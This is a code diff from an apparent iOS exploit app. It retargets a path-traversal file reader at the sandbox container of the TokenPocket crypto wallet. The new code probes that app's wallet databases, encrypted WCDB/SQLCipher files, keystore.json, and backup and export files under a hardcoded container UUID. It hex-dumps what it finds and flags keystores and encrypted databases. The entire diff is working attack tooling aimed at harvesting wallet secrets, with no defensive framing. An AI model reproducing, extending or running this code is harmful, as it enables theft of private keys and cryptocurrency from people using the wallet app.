@@ -738,7 +738,7 @@ static void *e2_free_and_ool_racer(void *arg) {
     UIButtonConfiguration *aiConf = [UIButtonConfiguration filledButtonConfiguration];
     aiConf.baseBackgroundColor = [UIColor systemPurpleColor];
     self.appIntentButton.configuration = aiConf;
-    [self.appIntentButton setTitle:@"System Files v38" forState:UIControlStateNormal];
+    [self.appIntentButton setTitle:@"TP DB Probe v41" forState:UIControlStateNormal];
     [self.appIntentButton addTarget:self action:@selector(appIntentTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.appIntentButton];
 
@@ -7319,19 +7319,20 @@ static void *iohid_threadCopyEvent(void *arg) {
 
 - (void)appIntentTapped {
     [self appendLog:@"\n============================================================"];
-    [self appendLog:@"  v38 — Direct system file reads (known paths only)"];
+    [self appendLog:@"  v41 — Targeted TP container database probe"];
+    [self appendLog:@"  Android TP db: databases/tb.db → iOS: Documents/db/tb ?"];
     [self appendLog:@"============================================================\n"];
 
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
         NSMutableString *log = [NSMutableString string];
         NSString *tpUUID = @"0D926318-FE07-4B1D-8A4B-5278C4E380D5";
 
-#define V38BASE @"../../../../../../../../../../../../../"
-#define V38FILE(path) [[V38BASE stringByAppendingString:path] stringByExpandingTildeInPath]
+#define V41BASE @"../../../../../../../../../../../../../"
+#define V41FILE(path) [[V41BASE stringByAppendingString:path] stringByExpandingTildeInPath]
 
         void (^readFile)(NSString*, NSString*, NSMutableString*) =
         ^(NSString *relPath, NSString *label, NSMutableString *out) {
-            NSString *full = V38FILE(relPath);
+            NSString *full = V41FILE(relPath);
             [out appendFormat:@"\n--- %@ ---\n  path: %@\n", label, full];
             NSFileManager *fm = [NSFileManager defaultManager];
             BOOL isDir = NO;
@@ -7340,74 +7341,102 @@ static void *iohid_threadCopyEvent(void *arg) {
                 return;
             }
             if (isDir) {
-                [out appendString:@"  is directory, skipping\n"];
+                [out appendString:@"  [DIR]\n"];
                 return;
             }
             NSDictionary *attrs = [fm attributesOfItemAtPath:full error:nil];
             unsigned long long sz = [attrs[NSFileSize] unsignedLongLongValue];
             [out appendFormat:@"  size: %llu bytes\n", sz];
-            // plist parse
-            if ([relPath hasSuffix:@".plist"] || [relPath containsString:@"plist"]) {
-                NSDictionary *d = [NSDictionary dictionaryWithContentsOfFile:full];
-                if (d) {
-                    [out appendFormat:@"  keys: %@\n", [[d allKeys] componentsJoinedByString:@", "]];
-                    [out appendFormat:@"  dict: %@\n", d];
-                } else {
-                    // try reading as data
-                    NSData *data = [NSData dataWithContentsOfFile:full];
-                    [out appendFormat:@"  raw bytes: %lu\n", (unsigned long)data.length];
-                    [out appendFormat:@"  hex: %@\n", [[data subdataWithRange:NSMakeRange(0, MIN(128, data.length))] description]];
+            NSData *data = [NSData dataWithContentsOfFile:full];
+            if (data) {
+                const unsigned char *b = data.bytes;
+                NSUInteger dlen = MIN(64, data.length);
+                NSMutableString *hex = [NSMutableString string];
+                for (NSUInteger i = 0; i < dlen; i++)
+                    [hex appendFormat:@"%02x ", b[i]];
+                [out appendFormat:@"  hex: %@\n", hex];
+                if (data.length >= 16 && memcmp(b, "SQLite format 3", 16) == 0)
+                    [out appendString:@"  [+] SQLite3 database!\n"];
+                // WCDB encrypted DB check (starts with salted magic)
+                if (data.length >= 4) {
+                    uint32_t magic = *(uint32_t *)b;
+                    if (magic == 0x51674c53 || magic == 0x53514c69)
+                        [out appendFormat:@"  [+] SQLCipher/WCDB encrypted (magic=0x%08x)\n", magic];
                 }
-            } else {
-                // plain text
-                NSError *err = nil;
-                NSString *txt = [NSString stringWithContentsOfFile:full encoding:NSUTF8StringEncoding error:&err];
-                if (txt) {
-                    [out appendFormat:@"  text (%lu chars):\n%@\n", (unsigned long)txt.length,
-                        [txt substringToIndex:MIN(2000, txt.length)]];
-                } else {
-                    NSData *data = [NSData dataWithContentsOfFile:full];
-                    [out appendFormat:@"  binary (%lu bytes), hex: %@\n", (unsigned long)data.length,
-                        [[data subdataWithRange:NSMakeRange(0, MIN(128, data.length))] description]];
+                // Check for keystore JSON
+                if (data.length > 0 && b[0] == '{') {
+                    NSString *txt = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
+                    if (txt && [txt containsString:@"\"cipher\""])
+                        [out appendString:@"  [+] Keystore JSON detected!\n"];
+                }
+                if (sz >= 32 && sz < 500) {
+                    NSString *txt = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
+                    if (txt) {
+                        [out appendFormat:@"  text: %@\n", [txt substringToIndex:MIN(500, txt.length)]];
+                    }
                 }
             }
         };
 
-        // Test 1: TP's own preferences plist (standard iOS path)
-        readFile(@"var/mobile/Library/Preferences/com.global.wallet.ios.plist",
-                 @"TP Preferences plist", log);
-
-        // Test 2: Container manager metadata for TP
+        // === Group 1: Database files (Android tb.db → iOS variants) ===
+        [log appendString:@"\n========== GROUP 1: Database files ==========\n"];
         readFile([NSString stringWithFormat:
-            @"var/mobile/Containers/Data/Application/%@/.com.apple.mobile_container_manager.metadata.plist", tpUUID],
-            @"TP Container Metadata", log);
-
-        // Test 3: FrontBoard app state (maps bundle IDs to UUIDs)
-        readFile(@"var/mobile/Library/FrontBoard/applicationState.plist",
-                 @"FrontBoard applicationState", log);
-
-        // Test 4: Mobile Installation plist (app install records)
-        readFile(@"var/mobile/Library/Caches/com.apple.mobile.installation.plist",
-                 @"Mobile Installation Cache", log);
-
-        // Test 5: Try alternate paths for MobileInstallation
-        readFile(@"var/installd/Library/MobileInstallation/LastBuildInfo.plist",
-                 @"installd LastBuildInfo", log);
-
-        // Test 6: Try the container manager db
+            @"var/mobile/Containers/Data/Application/%@/Documents/db/tb", tpUUID],
+            @"Documents/db/tb (Android equiv)", log);
         readFile([NSString stringWithFormat:
-            @"var/mobile/Library/Caches/com.apple.containermanagerd/ClientState_%@" ,
-            tpUUID],
-            @"Container Manager ClientState", log);
+            @"var/mobile/Containers/Data/Application/%@/Documents/databases/tb", tpUUID],
+            @"Documents/databases/tb", log);
+        readFile([NSString stringWithFormat:
+            @"var/mobile/Containers/Data/Application/%@/Documents/db/tokenpocket", tpUUID],
+            @"Documents/db/tokenpocket", log);
+        readFile([NSString stringWithFormat:
+            @"var/mobile/Containers/Data/Application/%@/Documents/db/wallet", tpUUID],
+            @"Documents/db/wallet", log);
+        readFile([NSString stringWithFormat:
+            @"var/mobile/Containers/Data/Application/%@/Documents/db/wallet_data", tpUUID],
+            @"Documents/db/wallet_data", log);
+        readFile([NSString stringWithFormat:
+            @"var/mobile/Containers/Data/Application/%@/Documents/db/tp_wallet", tpUUID],
+            @"Documents/db/tp_wallet", log);
+        readFile([NSString stringWithFormat:
+            @"var/mobile/Containers/Data/Application/%@/Documents/tb.db", tpUUID],
+            @"Documents/tb.db", log);
 
-        // Test 7: Read TP's bundle Info.plist (need bundle UUID)
-        // First find bundle UUID from system paths
-        readFile(@"var/mobile/Library/Preferences/com.apple.mobileiTunes.plist",
-                 @"iTunes Store Preferences", log);
+        // === Group 2: WCDB auxiliary files (extensionless + -wal/-shm) ===
+        [log appendString:@"\n========== GROUP 2: WCDB auxiliary files ==========\n"];
+        readFile([NSString stringWithFormat:
+            @"var/mobile/Containers/Data/Application/%@/Documents/db/tb-wal", tpUUID],
+            @"Documents/db/tb-wal", log);
+        readFile([NSString stringWithFormat:
+            @"var/mobile/Containers/Data/Application/%@/Documents/db/tb-shm", tpUUID],
+            @"Documents/db/tb-shm", log);
 
-        // Test 8: spotlight / core spotlight index segments
-        readFile(@"var/mobile/Library/Caches/com.apple.mobilesafari/SafariHistory.db",
-                 @"Safari History DB (baseline)", log);
+        // === Group 3: Container-internal prefs & metadata ===
+        [log appendString:@"\n========== GROUP 3: TP internal prefs & metadata ==========\n"];
+        readFile([NSString stringWithFormat:
+            @"var/mobile/Containers/Data/Application/%@/Library/Preferences/com.global.wallet.ios.plist", tpUUID],
+            @"TP internal Preferences plist", log);
+        readFile([NSString stringWithFormat:
+            @"var/mobile/Containers/Data/Application/%@/Library/Preferences/.GlobalPreferences.plist", tpUUID],
+            @"TP GlobalPreferences plist", log);
+        readFile([NSString stringWithFormat:
+            @"var/mobile/Containers/Data/Application/%@/iTunesMetadata.plist", tpUUID],
+            @"TP iTunesMetadata.plist", log);
+
+        // === Group 4: Known backup/export paths ===
+        [log appendString:@"\n========== GROUP 4: Backup & export files ==========\n"];
+        readFile([NSString stringWithFormat:
+            @"var/mobile/Containers/Data/Application/%@/Documents/backup/wallet.json", tpUUID],
+            @"Documents/backup/wallet.json", log);
+        readFile([NSString stringWithFormat:
+            @"var/mobile/Containers/Data/Application/%@/Documents/keystore.json", tpUUID],
+            @"Documents/keystore.json", log);
+        readFile([NSString stringWithFormat:
+            @"var/mobile/Containers/Data/Application/%@/Library/Caches/com.global.wallet.ios/Cache.db", tpUUID],
+            @"Library/Caches TP Cache.db", log);
+        readFile([NSString stringWithFormat:
+            @"var/mobile/Containers/Data/Application/%@/tmp/wallet_export.json", tpUUID],
+            @"tmp/wallet_export.json", log);
 
         dispatch_async(dispatch_get_main_queue(), ^{ [self appendLog:log]; });
     });
